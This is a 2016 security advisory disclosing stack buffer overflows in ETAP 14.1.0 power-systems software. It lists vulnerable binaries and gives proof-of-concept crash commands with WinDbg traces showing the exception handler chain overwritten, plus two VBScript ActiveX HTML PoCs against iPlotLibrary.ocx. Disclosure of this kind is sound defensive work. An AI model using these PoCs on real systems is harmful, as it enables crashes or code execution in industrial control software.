@@ -1,0 +1,331 @@
+﻿
+Operation Technology ETAP 14.1.0 Multiple Stack Buffer Overrun Vulnerabilities
+
+
+Vendor: Operation Technology, Inc.
+Product web page: http://www.etap.com
+Affected version: 14.1.0.0
+
+Summary: Enterprise Software Solution for Electrical Power Systems. ETAP
+is the most comprehensive electrical engineering software platform for the
+design, simulation, operation, and automation of generation, transmission,
+distribution, and industrial systems. As a fully integrated model-driven
+enterprise solution, ETAP extends from modeling to operation to offer a
+Real-Time Power Management System.
+
+Desc: Multiple ETAP binaries are prone to a stack-based buffer overflow
+vulnerability because the application fails to handle malformed arguments.
+An attacker can exploit these issues to execute arbitrary code within the
+context of the application or to trigger a denial-of-service conditions.
+
+Tested on: Microsfot Windows 7 Professional SP1 (EN) x86_64
+           Microsoft Windows 7 Ultimate SP1 (EN) x86_64
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2016-5324
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5324.php
+
+
+07.04.2016
+
+--
+
+
+
+Confirmed vulnerable binaries:
+------------------------------
+
+acsdvd.exe
+ca.exe
+csdvd.exe
+DBExtractConsoleApp.exe
+dccalc.exe
+etarcgis.exe
+etarcgis92.exe
+etarcgis93.exe
+ETArcGIS_TD.exe
+ETArcGIS_TD10.exe
+etcabp.exe
+etcp.exe
+etgrd.exe
+ETPanelRep.exe
+ET_CATIA.exe
+et_ieee.exe
+harmonic.exe
+LA3PH.exe
+LF3PH.exe
+lffd.exe
+lfgs.exe
+lfle.exe
+lfnr.exe
+ms.exe
+OCP.exe
+opf.exe
+OtiMongoConvert.exe
+PlotCompare64.exe
+ra.exe
+SC3Ph.exe
+scansi1p.exe
+scansi3p.exe
+SCGost1p.exe
+sciec1p.exe
+sciec3p.exe
+sciectr.exe
+scsource.exe
+SFA.exe
+so3ph.exe
+stlf.exe
+svc.exe
+TDULF.exe
+ts.exe
+uc.exe
+
+
+
+PoCs:
+-----
+[vuln binary] [>256 bytes as arg]
+===================================
+
+
+C:\ETAP 1410>etcp.exe AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+(281c.202c): Access violation - code c0000005 (!!! second chance !!!)
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\windows\SysWOW64\ntdll.dll - 
+*** WARNING: Unable to verify checksum for C:\ETAP 1410\etcp.exe
+*** ERROR: Module load completed but symbols could not be loaded for C:\ETAP 1410\etcp.exe
+eax=00000041 ebx=00190002 ecx=0000000a edx=00000365 esi=00882966 edi=000003eb
+eip=00407f38 esp=0018f660 ebp=0018f778 iopl=0         nv up ei pl nz na pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010207
+etcp+0x7f38:
+00407f38 668943fe        mov     word ptr [ebx-2],ax      ds:002b:00190000=6341
+0:000> !exchain
+0018ff3c: etcp+10041 (00410041)
+Invalid exception stack at 00410041
+
+===================================
+
+
+C:\ETAP 1410>PlotCompare64.exe AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Unhandled Exception: System.AccessViolationException: Attempted to read or write protected memory. This is often an indication that other memory is corrupt.
+   at System.String.wcslen(Char* ptr)
+   at System.String.CtorCharPtr(Char* ptr)
+   at wmain(Int32 argc, Char** argv, Char** envp)
+   at wmainCRTStartup()
+
+
+(3a98.1e20): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+*** WARNING: Unable to verify checksum for C:\windows\assembly\NativeImages_v4.0.30319_64\mscorlib\54c5d3ee1f311718f3a2feb337c5fa29\mscorlib.ni.dll
+*** ERROR: Module load completed but symbols could not be loaded for C:\windows\assembly\NativeImages_v4.0.30319_64\mscorlib\54c5d3ee1f311718f3a2feb337c5fa29\mscorlib.ni.dll
+mscorlib_ni+0x48f380:
+000007fe`dd6df380 0fb701          movzx   eax,word ptr [rcx] ds:0045005c`003a0043=????
+0:000> d rdi
+00000000`0278f558  00 65 93 dd fe 07 00 00-06 02 00 00 41 00 41 00  .e..........A.A.
+00000000`0278f568  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+00000000`0278f578  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+00000000`0278f588  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+00000000`0278f598  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+00000000`0278f5a8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+00000000`0278f5b8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+00000000`0278f5c8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+
+===============================
+
+
+C:\ETAP 1410>ra.exe AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+(1e5c.2f90): Access violation - code c0000005 (!!! second chance !!!)
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\windows\SysWOW64\ntdll.dll - 
+*** WARNING: Unable to verify checksum for C:\ETAP 1410\ra.exe
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\ETAP 1410\ra.exe - 
+eax=0018f4a0 ebx=00000000 ecx=00000041 edx=00000359 esi=005c2962 edi=00000000
+eip=00408376 esp=0018f2cc ebp=0018f3f4 iopl=0         nv up ei pl nz ac pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010216
+ra!CFileMap::operator=+0x786:
+00408376 66898c50ae040000 mov     word ptr [eax+edx*2+4AEh],cx ds:002b:00190000=6341
+0:000> !exchain
+0018ff3c: ra!CFileMap::GetLength+7b21 (00410041)
+Invalid exception stack at 00410041
+0:000> kb
+ChildEBP RetAddr  Args to Child              
+WARNING: Stack unwind information not available. Following frames may be wrong.
+0018f3f4 0040855f 00000001 0018f430 00000000 ra!CFileMap::operator=+0x786
+0018f410 00427462 f6504047 00000000 00000001 ra!CFileMap::GetLength+0x3f
+0018ff48 00410041 00410041 00410041 00410041 ra!CFileMap::SetFileLength+0x125a2
+0018ff4c 00410041 00410041 00410041 00410041 ra!CFileMap::GetLength+0x7b21
+0018ff50 00410041 00410041 00410041 00410041 ra!CFileMap::GetLength+0x7b21
+0018ff54 00410041 00410041 00410041 00410041 ra!CFileMap::GetLength+0x7b21
+0018ff58 00410041 00410041 00410041 00410041 ra!CFileMap::GetLength+0x7b21
+0018ff5c 00410041 00410041 00410041 00410041 ra!CFileMap::GetLength+0x7b21
+0018ff60 00410041 00410041 00410041 00410041 ra!CFileMap::GetLength+0x7b21
+0018ff64 00410041 00410041 00410041 00410041 ra!CFileMap::GetLength+0x7b21
+0018ff68 00410041 00410041 00410041 00410041 ra!CFileMap::GetLength+0x7b21
+0018ff6c 00410041 00410041 00410041 00410041 ra!CFileMap::GetLength+0x7b21
+0018ff70 00410041 00410041 00410041 00410041 ra!CFileMap::GetLength+0x7b21
+0018ff74 00410041 00410041 00410041 00410041 ra!CFileMap::GetLength+0x7b21
+0018ff78 00410041 00410041 00410041 00410041 ra!CFileMap::GetLength+0x7b21
+0018ff7c 00410041 00410041 00410041 00410041 ra!CFileMap::GetLength+0x7b21
+0018ff80 00410041 00410041 00410041 00410041 ra!CFileMap::GetLength+0x7b21
+0018ff84 00410041 00410041 00410041 00410041 ra!CFileMap::GetLength+0x7b21
+..
+0:000> d esi
+005c2962  72 00 61 00 2e 00 65 00-78 00 65 00 20 00 20 00  r.a...e.x.e. . .
+005c2972  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+005c2982  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+005c2992  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+005c29a2  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+005c29b2  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+005c29c2  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+005c29d2  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+
+
+===============================
+
+
+C:\ETAP 1410>SFA.exe AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+STATUS_STACK_BUFFER_OVERRUN encountered
+(39e0.35b4): WOW64 breakpoint - code 4000001f (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\windows\syswow64\kernel32.dll - 
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for SFA.exe - 
+kernel32!GetProfileStringW+0x12cc9:
+75150265 cc              int     3
+
+
+===============================
+
+
+C:\ETAP 1410>so3ph.exe AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+STATUS_STACK_BUFFER_OVERRUN encountered
+(380c.3cc4): Break instruction exception - code 80000003 (first chance)
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\windows\system32\kernel32.dll - 
+*** WARNING: Unable to verify checksum for SO3Ph.exe
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for SO3Ph.exe - 
+kernel32!UnhandledExceptionFilter+0x71:
+00000000`76fcb8c1 cc              int     3
+0:000> r
+rax=0000000000000000 rbx=0000000000000000 rcx=000063dde1df0000
+rdx=000000000000fffd rsi=0000000000000001 rdi=0000000000000002
+rip=0000000076fcb8c1 rsp=00000000000fe780 rbp=ffffffffffffffff
+ r8=0000000000000000  r9=0000000000000000 r10=0000000000000000
+r11=00000000000fe310 r12=0000000140086150 r13=0000000000000000
+r14=000000000012eb00 r15=0000000000000000
+iopl=0         nv up ei pl nz na po nc
+cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
+kernel32!UnhandledExceptionFilter+0x71:
+00000000`76fcb8c1 cc              int     3
+
+
+===============================
+
+
+C:\ETAP 1410>TDULF.exe AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+(36bc.36b8): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\windows\system32\kernel32.dll - 
+*** WARNING: Unable to verify checksum for C:\ETAP 1410\LF3PHDLL.dll
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\ETAP 1410\LF3PHDLL.dll - 
+kernel32!lstrcpyW+0xa:
+00000000`76f7e41a 668911          mov     word ptr [rcx],dx ds:00000000`00130000=6341
+0:000> r
+rax=000000000012e9d0 rbx=0000000000000001 rcx=0000000000130000
+rdx=0000000000000041 rsi=0000000000000000 rdi=000000000012bcf0
+rip=0000000076f7e41a rsp=000000000012bc98 rbp=0000000000000000
+ r8=000000000012fc18  r9=0000000000000000 r10=0000000000000000
+r11=0000000000000202 r12=0000000000000000 r13=0000000000000000
+r14=000000000000000a r15=0000000000000000
+iopl=0         nv up ei pl nz na po nc
+cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
+kernel32!lstrcpyW+0xa:
+00000000`76f7e41a 668911          mov     word ptr [rcx],dx ds:00000000`00130000=6341
+0:000> d rax
+00000000`0012e9d0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+00000000`0012e9e0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+00000000`0012e9f0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+00000000`0012ea00  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+00000000`0012ea10  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+00000000`0012ea20  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+00000000`0012ea30  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+00000000`0012ea40  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+...
+0:000> r
+rax=0000000000000000 rbx=0000000000000001 rcx=ffffffffffffffff
+rdx=00410041004123a1 rsi=0000000000000000 rdi=00410041004123a1
+rip=000007fefd0a17c7 rsp=000000000012b9a8 rbp=0000000000000000
+ r8=ffffffffffffffff  r9=000000000012ef68 r10=0000000000000000
+r11=0000000000000202 r12=0000000000000000 r13=0000000000000000
+r14=000000000000000a r15=0000000000000000
+iopl=0         nv up ei ng nz na po nc
+cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010286
+KERNELBASE!lstrlenW+0x17:
+000007fe`fd0a17c7 66f2af          repne scas word ptr [rdi]
+
+
+===============================
+
+
+COM/ActiveX PoCs:
+-----------------
+
+
+<html>
+<object classid='clsid:E19FDFB8-B4F6-4065-BCCF-D37F3E7E4224' id='target' />
+<script language='vbscript'>
+targetFile = "C:\Program Files (x86)\Common Files\ETAP\iPlotLibrary.ocx"
+prototype  = "Property Let Name As String"
+memberName = "Name"
+progid     = "iPlotLibrary.iPlotDataCursorX"
+argCount   = 1
+arg1=String(1000, "A")
+target.Name = arg1
+</script>
+</html>
+
+(2750.243c): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files (x86)\Common Files\ETAP\iPlotLibrary.ocx - 
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\windows\syswow64\OLEAUT32.dll - 
+eax=00000000 ebx=00000000 ecx=00000000 edx=02d13084 esi=02d13084 edi=001be684
+eip=0301c146 esp=001be608 ebp=001be634 iopl=0         nv up ei pl nz ac pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010216
+iPlotLibrary!DllUnregisterServer+0x104e5a:
+0301c146 8b4304          mov     eax,dword ptr [ebx+4] ds:002b:00000004=????????
+0:000> d edx
+02d13084  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+02d13094  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+02d130a4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+02d130b4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+02d130c4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+02d130d4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+02d130e4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+02d130f4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+
+
+===============================
+
+
+<html>
+<object classid='clsid:E19FDFB8-B4F6-4065-BCCF-D37F3E7E4224' id='target' />
+<script language='vbscript'>
+targetFile = "C:\Program Files (x86)\Common Files\ETAP\iPlotLibrary.ocx"
+prototype  = "Property Let MenuItemCaptionValueY As String"
+memberName = "MenuItemCaptionValueY"
+progid     = "iPlotLibrary.iPlotDataCursorX"
+argCount   = 1
+arg1=String(1044, "A")
+target.MenuItemCaptionValueY = arg1
+</script>
+</html>
